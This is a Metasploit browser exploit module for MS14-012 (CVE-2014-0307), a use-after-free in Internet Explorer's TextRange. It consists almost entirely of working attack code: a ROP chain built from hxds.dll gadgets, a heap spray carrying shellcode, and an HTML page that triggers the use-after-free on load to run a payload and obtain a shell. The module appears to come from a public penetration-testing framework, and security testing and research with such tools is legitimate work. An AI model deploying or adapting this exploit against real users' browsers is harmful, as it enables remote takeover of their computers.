# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MS14-012 Internet Explorer TextRange Use-After-Free",
      &#039;Description&#039;    => %q{
        This module exploits a use-after-free vulnerability found in Internet Explorer. The flaw
        was most likely introduced back in 2013, therefore only certain builds of MSHTML are
        affected. In our testing with IE9, these vulnerable builds appear to be between
        9.0.8112.16496 and 9.0.8112.16533, which implies August 2013 until early March 2014
        (before the patch).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jason Kratzer&#039;, # Original discovery
          &#039;sinn3r&#039;         # Port
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2014-0307&#039; ],
          [ &#039;MSB&#039;, &#039;MS14-012&#039; ]
        ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script/i,
          :os_name => OperatingSystems::WINDOWS,
          :ua_name => HttpClients::IE,
          :office  => "2010"
          #:ua_ver  => &#039;9.0&#039; # Some fingerprinting issue w/ os_detect, disabled for now
        },
      &#039;Targets&#039;        =>
        [
          [
            &#039;Automatic&#039;,
              {
                # mov eax,dword ptr [edx+0C4h]; call eax
                &#039;Pivot&#039; => 0x0c0d1020 # ECX
              }
          ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;       => "\x00",
          &#039;PrependEncoder&#039; => "\x81\xc4\x0c\xfe\xff\xff" # add esp, -500
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;Retries&#039;              => false, # You&#039;re too kind, tab recovery, I only need 1 shell.
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;DisclosureDate&#039; => "Mar 11 2014", # Vuln was found in 2013. Mar 11 = Patch tuesday
      &#039;DefaultTarget&#039;  => 0))
  end

  # hxds.dll
  def get_payload
    setup =
    [
      0x51C3B376, # rop nop
      0x51C2046E, # pop edi; ret
      0x51BE4A41, # xchg eax, esp; ret
    ].pack("V*")

    # rop nops
    45.times { setup << [0x51C3B376].pack(&#039;V*&#039;) }

    setup << [
      0x51C2046E, # pop edi ; ret
      0x51BD28D4  # mov eax, [ecx], call [eax+8]
    ].pack(&#039;V*&#039;)

    p = generate_rop_payload(&#039;hxds&#039;, payload.encoded, {&#039;target&#039;=>&#039;2010&#039;, &#039;pivot&#039;=>setup})

    Rex::Text.to_unescape(p)
  end

  def exploit_html
    template = %Q|<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv=&#039;Cache-Control&#039; content=&#039;no-cache&#039;/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge" >
    <script>
      <%=js_property_spray%>
      sprayHeap({shellcode:unescape("<%=get_payload%>")});

      function hxds() {
        try {
          location.href = &#039;ms-help:&#039;;
        } catch(e) {}
      }

      function strike() {
        hxds();
        var fake = "";
        for (var i = 0; i < 12; i++) {
          if (i==0) {
             fake += unescape("<%=Rex::Text.to_unescape([target[&#039;Pivot&#039;]].pack(&#039;V*&#039;))%>");
          }
          else {
            fake += "\\u4141\\u4141";
          }
        }

        var elements = [
          &#039;FOOTER&#039;, &#039;VIDEO&#039;, &#039;HTML&#039;, &#039;DIV&#039;, &#039;WBR&#039;, &#039;THEAD&#039;, &#039;PARAM&#039;, &#039;SECTION&#039;, &#039;IMG&#039;,
          &#039;TIME&#039;, &#039;ASISE&#039;, &#039;CANVAS&#039;, &#039;P&#039;, &#039;RT&#039;, &#039;FRAMESET&#039;, &#039;TRACK&#039;, &#039;CAPTION&#039;
        ];

        for (var i = 0; i < elements.length; i++) {
          var element = document.createElement(elements[i]);
          document.body.appendChild(element);
        }

        var tRange = document.body.createTextRange();
        tRange.moveToElementText(document.body.children[16]);
        tRange.execCommand(&#039;InsertInputSubmit&#039;, true, null);
        tRange.moveToElementText(document.body.children[0]);
        tRange.moveEnd(&#039;character&#039;,4);
        tRange.execCommand(&#039;InsertOrderedList&#039;, true, null);
        tRange.select();
        tRange.moveToElementText(document.body.children[0]);
        tRange.moveEnd(&#039;character&#039;,13);
        tRange.execCommand(&#039;Underline&#039;, true, null);
        tRange.execCommand(&#039;RemoveFormat&#039;, true, null);
        var fillObject = document.createElement(&#039;button&#039;);
        fillObject.className = fake;
      }
    </script>
  </head>
  <body onload=&#039;strike();&#039;></body>
</html>
    |

    return template, binding()
  end

  def on_request_exploit(cli, request, target_info)
    send_exploit_html(cli, exploit_html)
  end

end

